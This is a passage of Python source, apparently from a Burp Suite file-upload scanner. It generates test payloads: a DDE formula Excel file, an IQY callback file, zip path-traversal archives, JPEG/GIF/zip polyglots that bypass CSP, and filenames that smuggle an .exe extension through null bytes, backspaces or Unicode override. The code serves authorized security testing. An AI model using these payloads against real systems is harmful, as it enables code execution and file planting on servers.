                             'M52RnT7yN6dqapZLHx94+ZjRFJa7NbMfEB299a2kzjJ6CTH3LMx4/LbRan3n5fr72m55FX85qRP4Wv/75nCLHyT1NOVFOfl9OZIsVtHpc+TBhn2vT6y' \
                             'vrSxO+SqnZ14+4EVvW01zlmlN08cGTyKQ3vzSMSM2gXq4On60WN5U0f+Qsn6gblPsZzzKPrq8sqt5+MODDeNcaz5+yXppNnudsum2Z1N1DEwvyHzI0V' \
                             'GNb9lTtXzu9dPLSUk/xOxaHZ7t/OJzNuOef6ED7nRahXf8bzHrn2e5LlE+E39u+ytA/sOiqxlEr3bV54XN6LBJjC+5/1r27+JPksh0g/cXn+FkPpJVI' \
                             '6X6muc7upn+7XxofEZGf9Poe7a3YbSNv7U1HH94rfFDqHzg2r6nq0Y7xDlcXuxjK1FunHDx18gLNOraspdZnmqbYS4bvLKnXrmdOPKeo/3b8zfTGkwT' \
                             '/p7l1p8gTlxl4/PTjg+s92a9lJUGHT1YHjyuU2OFt0HlnxgOTo77rgsvMXjYHTgrO9pov27Txq8L84IbEpIBjNUuKO5/UG9ZvHrfxultQ7S7Ln1PoQU' \
                             'UTijsrMs/ldtsRp79Ylm+16G5rxdRDAV1ZrlX7744v+7Y5cGHDS2uJfEeH6DIX4+Qut/T0mAoti7VF3vl/de1aPdX5VmzZjPr9czrI9TFRqglBYYtlj' \
                             'k5018o1vFi+524REwjqtWVvbf31FLzSILA2QXH32qxxFn7g0TvucpeqNlHK6F69hBIb23ROPlv3wfqGottiGU8tZa0ctL06X8sW0yhG64Iv5C48v+uX' \
                             '2uGhZn+bRh5Wp/z0asfPe6oWn+nMmuSt7JHZYhtWsmB1Vqz16xER2TP03XW1vfWNTHczhum5bstr2DDrS1qxTf6WOU/H5P/hePV8w7TuxJT97/YSkv/' \
                             'UrgiRX9EM1HZ67mGe+MdGPTPCWEs54IeXY3zLGnH9367UPRq797Ab6Zr/uXOXH/YlnUA0BP0PxHlFwLAcD4AfmXLEhMAzTsVHxI/0OKJGFD7uwyPhh1' \
                             '0cuSMIyVQQBt4JuCZZUoN2Cc8Z4tjD3uLwLwACrcMyZC+cue3Fzeo2Qd0m3GwO7WxnPUssz/MssTRRiSduiB0AlXZo2zkRm/wS4exTDrtWwPYwyMMkf' \
                             'T/0rtE9xNMhCNOPx/QG2Hk1pknjms3poJUvQCOsgt9UkRAX2uScjoXOwM66MHQ4Js8d9Liu9eG1v0VxbZjZK4dxXNcHsF2a6OlP9EfC5n/mmDQ5sD/l' \
                             'KvMouiAPlwfcMtGcfTUbWiEFUrCd+QBoq8mx9ngRh/XlCetMIcr3XtN6lXKwgEdhl3LYE7SoEmC33yXAPFakuzCIJaazJyqCU1gBTuIyYyMsko08ZhI' \
                             'hpBx7Xwp7jh5BUYEHdyACWoUQm8IqWJH82wpaLSFjazq8gjzj0Zpf33+ZGSl/JJsCDPROtKD9gvsBaz8v+n4SYO1NmwZY23PnAtYTE5GA9RxKGmA9Xr' \
                             'IJsJrn3YD1JNJTEmt3OIqDXiqA+ATdo/rgvjCUERsfG55AdV4aSo/GONNu6fpqezUSsGtyio0lvGZvtBKJSEQiEpGIRCQiEYlIRCISkYhEJPwibP5Pb' \
                             'K5vzjPSkN+2C87/aV+K0fz/KmA9RYu+R69kQS93QPN+tDqFdpahRUO0XQ/N3dE2GjTvTwaspc0MwFkPQOsDBwDvegCpl5s1l5fvW5Ht71NTnmUHsoe9' \
                             'CwXIyLNANXuNc2SE0BcmxIdEP01IoDP6HvkSiUhEIhKRiEQkIhGJSEQiEpGI5P+TYPN8APreM4PeGoZ2kaDf+NHv8WhujbaAoDk3mrOj+TvauYKm1mi' \
                             'Oj57ZQL/5o3k+e/cNmuuj9QD0fj70ej30djz0cju0UQrtZ0FTc/RiN/R/I9Br1dB+G/RSM/ROMvRKMfRGML3e79Hrr9DbptALpND7mtCrldDbkox7v/' \
                             '8HHj/+tf8y4d9KvEEs9rwPFThjTykywLIh+Y8yECewsZAfUSmstaSLrK+ncoeNc3DpkVzZSGD/vxAkvpAdPVwWgtkRNSRuJIqASOBOz2Dj6dizPsWBD' \
                             '/bs02LsYbBlYDrMhXDMJqRBT4vGYo9q9Sf6kB/VIVR/BstPRSd5Nv8UyBCK2cB6TnRo9tj8J9Kvz8X/H9O3feQ='
            content_excel = content_excel.decode("base64").decode("zlib")
            title = "Malicious Excel upload/download"
            desc = "An Excel spreadsheet with the content =cmd|' /C calc'!A0 in the first cell was uploaded and " \
                   "downloaded. When this spreadsheet is opened in Microsoft Excel, and the user confirms several " \
                   "dialogues warning about code execution, the Windows calculator will open (RCE). See " \
                   "https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details."
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_excel))
            self.sender.simple(injector, Constants.EXCEL_TYPES, basename, content_excel, redownload=True)
            # TODO feature: Burp collaborator based for Excel format...

        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "IqyExcel"
        title = "Malicious IQY upload/download"
        desc = 'A IQY file with the content pointing to a URL was uploaded and downloaded. When this file is opened in ' \
               'Microsoft Excel, and the user confirms dialogues warning or the server automatically parses it, a ' \
               'server is contacted. See https://twitter.com/subTee/status/631509345918783489 for more details.'
        content = 'WEB\r\n1\r\n{}["a","Please Enter Your Password"]'.format(Constants.MARKER_COLLAB_URL)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
        self.sender.simple(injector, Constants.IQY_TYPES, basename + "Mal", content, redownload=True)
        if burp_colab:
            # Also do collaborator based:
            desc += "<br>In this case we actually detected that interactions took place, meaning the server executed " \
                    "the payload. Interactions: <br><br>"
            issue = self._create_issue_template(injector.get_brr(), "Malicious IQY Collaborator Interaction", desc, "Firm", "High")
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.IQY_TYPES, basename + "Colab",
                                                       content, issue, redownload=True))

        # TODO Burp API limitation: We could include a Link in a spreadsheet document and hope/wait for someone
        # to click and then detect it via Burp Collaborator. However, as long as we have the Burp API limitation
        # of not being able to keep collaborator interactions for a long time as an extension, there is no point.
        return colab_tests

    def _path_traversal_archives(self, injector):
        # TODO feature: Check if there is anything we could do better and look at
        # https://github.com/portswigger/file-upload-traverser

        # good implementations for zip unpacking (such as unzip) give a warning such as the following:
        # warning:  skipped "../" path component(s) in ../../1DownloadMeinfo
        if injector.opts.file_formats['zip'].isSelected():
            basename = Constants.FILE_START + "ZipPathTraversal"
            filecontent = "Upload Scanner Burp Extension ZIP path traversal proof file. If you find this file " \
                          "somewhere where no files should be unpacked to, you have a vulnerability in handling " \
                          "zip file names that include ../ ."
            files = [
                ("../" + Constants.DOWNLOAD_ME + "info1", filecontent),
                ("../../" + Constants.DOWNLOAD_ME + "info2", filecontent),
                ("../../../" + Constants.DOWNLOAD_ME + "info3", filecontent),
                ("../../../../../../../../../../../var/www/" + Constants.DOWNLOAD_ME + "info4", filecontent),

                ("info/../../../" + Constants.DOWNLOAD_ME + "info5", filecontent),

                ("\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info6", filecontent),
                ("info\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info7", filecontent),

                ("%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info8", filecontent),
                ("info%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info9", filecontent),

                # ("../../../../../../../../../../../usr/var/www/" + self._download_me + "info10", filecontent),
                # ("../../../../../../../../../../../Local/Library/WebServer/" + self._download_me + "info11", filecontent),
                # ("../../../../../../../../../../../usr/local/apache2/" + self._download_me + "info12", filecontent),
                # ("../../../../../../../../../../../usr/local/httpd/" + self._download_me + "info13", filecontent),
                # ("../../../../../../../../../../../usr/apache/" + self._download_me + "info14", filecontent),
                # ("../../../../../../../../../../../srv/" + self._download_me + "info15", filecontent)
            ]
            title = "File path traversal"
            desc = 'A zip file was uploaded that includes several filenames that start with ../ such as ' \
                    '../../proof.txt . It was detected that a file with the exact same file content was downloaded again. ' \
                    'You might also want to check if it is returned with content-type text/html, which might lead to XSS.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Medium")
            # TODO feature: is there any way we can support the user to access those proof files? Maybe just search for it?
            for f in files:
                content = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool).create_zip([f, ])
                # If we check for the entire content to not be included, these will match eacht other
                # However, if we require that PK is not in the response, then it won't match any of the zip files
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=filecontent, not_in_filecontent="PK"))
                self.sender.simple(injector, Constants.ZIP_TYPES, basename, content)

    def _polyglot(self, injector, burp_colab):
        colab_tests = []

        # While I thought about implementing a GIFAR payload, I don't think it is worth doing nowadays

        if injector.opts.file_formats['jpeg'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PolyJpegCsp"
            content = '/9j/4Ak6SkZJRi8qAQEASABI'
            content += 3096 * "A"  # the nulls in the header base64 encode to A...
            content += 'Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4' \
                      '7R4M+53qq7v7f/2wBDAR8hISwnLFcwMFe3emh6t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7f/wAARCABE' \
                      'AEQDAREAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAAAAIEBQMGAf/EADEQAAEDAgEKBQQDAQAAAAAAAAEAAgMEEZEFEhMhMTNBUVKBFBUiU9EyYX' \
                      'GhNEJzsf/EABgBAQEBAQEAAAAAAAAAAAAAAAADBAEC/8QAHxEBAAICAwEBAQEAAAAAAAAAAAEDAhESMTITIVFB/9oADAMBAAIRAxEAPwCfSye4/FAa' \
                      'WT3H4oDSye4/FB2pJJDVwgvcRnt4/dBq5ScWujsSNR2FQunpopiJ2kD39TsVn3K+oMHu6jim5NQYPd1HFc3JqF9GSYdZvrWqnyy2+nmlZIIBBs5Mox' \
                      'Tx+Jn1OtcA/wBR8pM6/XYjc6hyqJzPJnbGjYFjzy5S24YcY0QKb0YIGC4L6Lc91rp8sl3p5tWSCDSyVQ6RwnlHoH0g8Sg61tVpn5jD6B+1msz3+Q11' \
                      'V8Y3PaYKKxwuOGCBguC+i3Pda6fLJd6ebVkjQ6PSN02dmX15u0oNhuV6VrQ1scgAFgA0fKBo8qU0kjWNjku4gC7Rx7po2MpgB0dhwKz3f400dSkCzr' \
                      'mCBguC+i3Pda6fLJd6ebVkggEHWj/lwf6N/wCoNrKEb5HMzGl1gb2ChbjM60vTlEb2lFPN7bsFHhl/F+eP9Do3sF3NIH3C8zjMdkZRPQC8vS+i3Pda' \
                      '6fLJd6ebVkggEDRPMUrJALlrg634QaPnUnssxQaUErzT6WdojO23ILkzERuXYiZnUIZ5jM+51AbAsWefKWzDDjBQvD2votz3WunyyXenm1ZIIBAINL' \
                      'JVDnkVEo9A+kHj90FFXUaV2a0+gftZLM+U6jprrw4xue3AKSpguC+i3Pda6fLJd6ebVkggEHSnYJKiJjtbXPAOKDbr5DFGyJgzWkcOXJRuymI0vTjE' \
                      'zuUIWVpMEDBcF9Fue610+WS70z/LIeqTEfCskPLIeqTEfCA8sh6pMR8IHhydEyZjw592uBFyOf4QW1UDZi0uJFuSnnjGXatec49OHg4+bsVP5Qp9ZN' \
                      '4SPm7Fc+UOfWX3wrObk+UH1lRAwRssL2vxVsMYxjUJKi8vL//Z'
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', Constants.MARKER_ORIG_EXT, 'image/jpeg'),
                ('', '.jpg', ''),
                ('', '.jpg', 'image/jpeg'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a jpeg and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self.sender.simple(injector, types, basename, content, redownload=True)

        if injector.opts.file_formats['gif'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PolyGifCsp"
            content = 'R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h' \
                      '7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f' + 111 * "/"
            content += 'yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5' \
                      'lYXQuIjsgLyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAQgICAgACwAAAAAjwBYAAAG/' \
                      'sCRcEgsGo/IpHLJbDqfxod0Cq1ar9isVjjtSrfgsHiM9HrJ6LTaaTav33B12x2v27Pz7n3Pb+b1fYGCQ1QjbYOIfYBchYmOdY2PknuLk5ZxlZeaaZm' \
                      'bnmBnn6KgnaOmT6Wnqkqhq65Lra+yUamzr7G2s3S5tru8sr6/rrjCqsHFp8fIo8rLn83Om9BQANXW19jYRtZaIhUdIGvcWIdb2efoAETaVxMR7xEYa' \
                      'exW5Vnp+OznVhgV/v4URJDZV4+YlXwI1Y0g+KSBhQwQI3IYmO3KNCcJ8wlh6GSBhg4gQ3qgSA/VxSYZ0w3h2OTCxBAwRYQjea2gwYMpS7J0smFI/og' \
                      'OaHYysRe0ohKW1Zp8ECLwiMJtT5EI3VjmJJapKyuqvEIPnVSjRUoyqgUG68acSaGOy1oTodqaYcEasnpVrlO0adfpxBt1oV2vhOhytfsWrd69fA/DP' \
                      'cvxD9Gxke6KLZxT8Vq/idkuxkfEMbHHlPuGzmg5L+bMp8dxDuw58tybmi9LBrs6tenVtffVhlxoDi3YjBd/JQzYdtTisdcaLlIOtO+jhONONv6Uo9D' \
                      'ilX8Dcn7SrPHZm+VeZ5iyaijuwIPLDg1eufjo2BOa3/74OfTppUVTT34cPnnS2vV2DGjt6ZdfgdW9N1188gX4xWudEMjefcLxlyBiFarnHoCd/rlhH' \
                      '2+uFbjEeLQpmOF+GqqzFWt6oEfWgRSuh+J3/CFYI3VR0VGfhBMmQWJXJsrIIFyrNedLHoH5GB2M0gGJoZD/OWnUIR8i+ZqS+N3YZHhPmmahljhCSAV' \
                      'RVoYIpoijgfkjlxWmo+ObSJLl3ZobCkdnXkihA2ecf4y45JkpXminfyVOdk4Au/QpZno0YnmibUw2umV/C2IjQKL2WclElpY56qWhj0La6XDVKHDkZ' \
                      '4xK94SMcSk53KYGsqrXotEY08oBBwyB6wi49rrrr7nWismtvBarqxC/HhussGvs0iuvuxoLbK7PMttsJdRGiyyy1CprrRyxPFttsNNK+y0aUoKdy0e' \
                      '66t6RaruKvAhvIO/O66689lJiZr6C4MuvHf7+C0fAAr9BcMHgPoDwvZHsu/AYRj748LWOTTywZxYbXHHGFH/IMbqafpxwvSKTc3AYQQAAIf4qLyAvL' \
                      'yAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgBCAgICAAOw=='
            content = content.decode("base64")
            types = {
                # ('', self._marker_orig_ext, ''),
                ('', Constants.MARKER_ORIG_EXT, 'image/gif'),
                ('', '.gif', ''),
                ('', '.gif', 'image/gif'),
            }
            title = "CSP Bypass"
            desc = 'A file that is a gif and a JavaScript file at the same time can be uploaded, which allows CSP bypasses. See ' \
                    'http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html for details, but this PoC polyglot ' \
                    'was taken from http://www.thinkfu.com/blog/gifjavascript-polyglots . Note that this PoC only works if the HTML page ' \
                    'includes a HTML id named "jsoutput" where the innerHTML attribute can be set. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            # The image was once actually transformed but stayed nearly a valid GIF and a JS file, so we try to match for this true
            # positive as well because I *believe* such a transformation can be turned into a CSP bypass as well
            alternative_issue = issue.create_copy()
            alternative_issue.detail += "It was detected that the file was processed on the server side (probably " \
                                        "GraphicsMagick), however, it seems that a polyglot is still feasible with the " \
                                        "processing taking place."
            alternative_content = 'GIF89a= \' \xf5$\x00\x00\x00\x00(\x00\x00Y\x00\x00ddd\x80\x80\x80\x8e\x8e\x8e\x96\x96\x96\x99\x99\x99\xaa' \
                                  '\x00\x00\xaa\xaa\xaa\xbc\x00\x00\xbf\xbf\xbf\xc6\x00\x00\xcb\xcb\xcb\xcc\x00\x00\xd4\x00\x00\xdb\x00\x00' \
                                  '\xdb11\xde\xde\xde\xdf??\xe2QQ\xe3[[\xe6jj\xe7\xe7\xe7\xe8{{\xeb\x87\x87\xeb\x8a\x8a\xed\x94\x94\xf1\xab' \
                                  '\xab\xf2\xb1\xb1\xf4\xbe\xbe\xf4\xc3\xc3\xf7\xcd\xcd\xf9\xdc\xdc\xfa\xe1\xe1\xfd\xfd\xfd\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' \
                                  '\xff\xff!\xf9\x04\x00\x00\x00\x00\x00!\xfe\xc7;document.getElementById("jsoutput").inerHTML = "ThinkFu r' \
                                  'eckons Caja is rather neat."; /*'
            self.dl_matchers.add(DownloadMatcher(alternative_issue, filecontent=alternative_content, check_not_content_disposition=True))
            self.sender.simple(injector, types, basename, content, redownload=True)

        # We always send this, as long as the polyglot module is activated, we assume the user wants this...
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "CorkamixPePdfJarHtml"
        content = 'eJytVF9PE0EQn4Ni4fgrUDXGhxVjWmLao0QjoccFKG2EUmxoYwykMdfe0i7e3TZ3C6FRnvwofgJN9MEHX/TJxFe/jIk6e1dsoeCTu9nb2Zm5385Mfjv' \
                  'FvZV0puUxVyTmstx7aRY3n5P9Vls0uVudm799v7SRT6ZTKq8d6rph+MKjpqPqTeHYxioAlHIA2wpcGAPKqNJFK+WqsHTOZxUi+I30aCKg17jVNnz08' \
                  'zq+gxdhO2O8Ry703f1/hsQd/od98tZScw/z+B0rKKvw483XyBfaE8oLJYRw/OO6JwCCCh+ENt0XbZsaMl3yihwzn9WYzUR7ucksi7qZU5JyzxtC2aY' \
                  'Z0uI+E4y7y8Ss+dw+ElJnWhZzG8tkgaTpSfjNEMf0Ggz9FjJE8Faw2/RABMIpaabxhtAlGZpTD7t/JWtcCO5I7ZLUnupaGLNusWNSt03fX3ENovt1j' \
                  '7UEEe0WXYkLeiK0Q/PYDLVxw7SpJxLxLg+eVIrbD7bQoxx4VOPzGQQOZEO/m0yWCoMR9dJqj+Aq5ipryc2dvNbvdq+zZnvdims7m/lcuZIq5rNIWkG' \
                  't5DqWMq0WTcwwK5NYJnUZnMNO1H7Qn0q4JlA+c0sFuX/79ekzkjMJN6PIdBg+s0YhosCULIFmm25De1o7pHWhQMTBGxW4kdjf7hrLAinRyMw/Q3uWW' \
                  '3QEkxyNgnoOodz2BXXGYAzGFRjkRwgWCzEY10qSU+XgQWaGYVKBO91SyyqT7PZauUyYS7bWdqsqXIeZKEwrMHMJwBjWLqZANOCpjcHGEpfH+p26Vqc' \
                  'JoIRdQU0j44LuoBWY5e/jXjI96goiDbtalrsCT/7+ojxWDaOq7VKfH3l16suOYhiLZwB/28t6RbPogXlkC7K0QCoHARTyGufj9CNScRI9zWUjX52vH' \
                  'JJcRe0LTXgmQxJiSLuciyCyBvXDwOTNKig4wzajYP2H4BruUTzFYADkcx55D8PTEx9h6l1IilJBGZiFq0kajqnO3kPZ/t96SRsOgit+BYUvQ+hlaBf' \
                  'hdR9fS4Wha9I6iPMD7m8H5OkP3+Q/0w=='
        content = content.decode("base64").decode("zlib")
        # we only upload as PDF type as that is the likeliest to succeed of all those formats
        title = "CSP Bypass"
        desc = 'A file that is a PDF, Jar, HTML, JavaScript and PE file at the same time (corkamix) can be uploaded and downloaded, which allows CSP bypasses. The '
        desc += 'file was taken from https://code.google.com/archive/p/corkami/downloads?page=2 . '
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
        self.sender.simple(injector, Constants.PDF_TYPES, basename, content, redownload=True)

        if injector.opts.file_formats['zip'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "JsZip"
            content = "prompt(123);PK\x03\x04\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00" \
                      "empty.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00" \
                      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00empty.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" \
                      "7\x00\x00\x00'\x00\x00\x00\x00\x00"
            title = "CSP Bypass"
            desc = 'A file that is a JavaScript and Zip file at the same time can be uploaded and downloaded, which allows CSP bypasses. The ' \
                    'file is just the JavaScript prompt function with a concatenated zip file with an empty.txt in it. As zip files do not need ' \
                    'to start at the beginning of the file, some implementations unzip this file just fine. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_not_content_disposition=True))
            self.sender.simple(injector, Constants.ZIP_TYPES, basename, content, redownload=True)

        return colab_tests

    def _fingerping(self, injector):
        if not injector.opts.file_formats['png'].isSelected():
            # we only upload PNG files in this module
            return
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only fingerprint(when the files are downloaded again)
            return
        f = Fingerping()
        # we only send the fingerping files as valid PNG files
        types = [('', '.png', 'image/png')]
        downloads = {}
        number_of_responses = 0
        last_picture = ''
        last_status_code = 0
        # First, we need to upload the test files
        for orig_filename in FingerpingImages.all_images:
            downloads[orig_filename] = None
            # it doesn't really matter which filename in the upload request we use as long as we know
            # which original filename it was. So let's remove - and _ in the filename for consistency in this extension
            basename = Constants.FILE_START + "Fingerping" + orig_filename.replace("-", "").replace("_", "")
            content = FingerpingImages.all_images[orig_filename]
            urrs = self.sender.simple(injector, types, basename, content, redownload=True)
            if urrs:
                # With one member of types, we also only get one:
                urr = urrs[0]
                if urr and urr.download_rr:
                    i_response_info = self._helpers.analyzeResponse(urr.download_rr.getResponse())
                    resp = FloydsHelpers.jb2ps(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    if body.startswith('\x89PNG'):
                        # print("Downloaded", orig_filename, "is a PNG. Content:")
                        # print(repr(body))
                        # Make sure this image is not the same as *the last* image we uploaded and successfully downloaded
                        # but where the upload response had a different status code.
                        # This is necessary because otherwise we get a lot of false positives/incorrect results
                        # as the extension thinks the file was uploaded successful, but it was not changed and the
                        # image is just the last test we uploaded, not the current. This is not optimal, as the response
                        # might better indicate if a file was successfully parsed/modified or not. Actually,
                        # the non-ordering of Python dictionary helps, as FingerpingImages.all_images is not
                        # iterated in the sequence it was initialized with, so pictures that are not *exactly* the
                        # same but look the same (eg. color test) but a server tool might convert to the exact same image
                        # are not uploaded after each other... This works OKish so far.
                        status_code = self._helpers.analyzeResponse(urr.upload_rr.getResponse()).getStatusCode()
                        if body == last_picture and not last_status_code == status_code:
                            print("Fingerping: Ignoring downloaded picture", orig_filename, "as it probably didn't change on server")
                        else:
                            last_picture = body
                            last_status_code = status_code
                            downloads[orig_filename] = body
                            number_of_responses += 1
                            # TODO feature: As dominique suggested, detect if it was converted to JPEG by the server
                            # if yes convert JPEGs to PNG and then use them in the same way...

        confidence = "Tentative"
        print("Fingerping module was able to download", str(number_of_responses), \
            "of", str(len(FingerpingImages.all_images)), "images as PNGs again")
        results, fingerprintScores = f.do_tests(downloads, True)
        text_score, total = f.get_results_table(fingerprintScores)
        highest_score = text_score[-1][1]
        score_percentage = float(highest_score) / total

        if score_percentage > 0.6:
            confidence = "Certain"
        elif score_percentage > 0.85:
            confidence = "Firm"

        result_table = "<br>".join([text + " " + str(score) + "/" + str(total) for text, score in text_score])

        title = "Fingerping Fingerprinting results"
        desc = "The fingerping tool is able to fingerprint images libraries that modify a set of png files that are " \
               "uploaded. The original project by Dominique Bongard is located at https://github.com/0xcite/fingerping " \
               "and the fork that is used in this extension here: https://github.com/floyd-fuh/fingerping/ . <br><br>" \
               "Knowing the server side image parser is important to do a security test, for example to check for " \
               "an old version or to go back and fuzz the parser, then exploit it on the server. <br><br>The module " \
               "was able to download {} of {} images as PNGs again (can be good and bad). <br><br>" \
               "The common error case occurs when the server overwrites the same file name again and again but " \
               "keeps the last uploaded content if image transformation fails. UploadScanner tries to detect this " \
               "(different status code) but can not if the status code is the same in success and fail case. After " \
               "all it is not as unlikely that test images are converted to identical images.<br><br>" \
                "The result of the fingerping run is (last line is the most likely match): <br><br>{}<br><br>" \
                "If there was no full match (60/60) and you know the exact library used on the server, please " \
                "consider submitting the following fingerprint at https://github.com/floyd-fuh/fingerping/ " \
                "together with the exact version of the image library on the server. Please also make sure " \
                "that the common error case does not apply." \
               "<br><br>{}".format(str(number_of_responses), str(len(FingerpingImages.all_images)),
                               result_table, repr(results))
        issue = self._create_issue_template(injector.get_brr(), title, desc, confidence, "Information")
        self._add_scan_issue(issue)

    def _quirks_with_passive(self, injector):
        if not injector.get_uploaded_filename():
            # If the request does not contain a filename, there is no point in doing these requests
            return
        # TODO feature: Surrogate pairs? Invalid overlong Unicode?
        # TODO feature: in general feedback to this module...
        orig_content = injector.get_uploaded_content()
        base_request_response = injector.get_brr()
        random_part = ''.join(random.sample(string.ascii_letters, 3))

        file_extension = FloydsHelpers.u2s(injector.get_default_file_ext())
        semicolon_ie = Constants.DOWNLOAD_ME + "Semicolon" + random_part+".exe;" + file_extension
        title = "Semicolon in Content-Disposition"
        desc = 'Internet explorer might interprete a HTTP response header of Content-Disposition: attachment; filename="evil_file.exe;.txt" as an exe file. ' + \
               "A filename of " + semicolon_ie + " was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=semicolon_ie))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3B" + file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3b" + file_extension))
        req = injector.get_request(semicolon_ie, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=semicolon_ie)

        nulltruncate = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe\x00" + file_extension
        title = "Null byte filename truncate"
        desc = 'A filename of ' + cgi.escape(nulltruncate) + " (including a truncating zero byte after .exe) was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(nulltruncate, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=exp)

        backspace = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe" + file_extension + "\x08" * len(file_extension)
        title = "Backspace filename truncate"
        desc = "We uploaded a filename of " + backspace + " (having the 0x08 backspace character several time at the end) and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
        issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
        exp = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe"
        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                             not_in_filename_content_disposition=file_extension))
        self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
        req = injector.get_request(backspace, orig_content)
        if req:
            self._make_http_request(injector, req, redownload_filename=exp)

        left_to_right = Constants.DOWNLOAD_ME + "\xe2\x80\xaeexe.thgirottfel" + random_part + file_extension
        random_part_reverse = random_part[::-1]
        title = "UTF-8 Unicode left to right overwrite"
        desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite " \
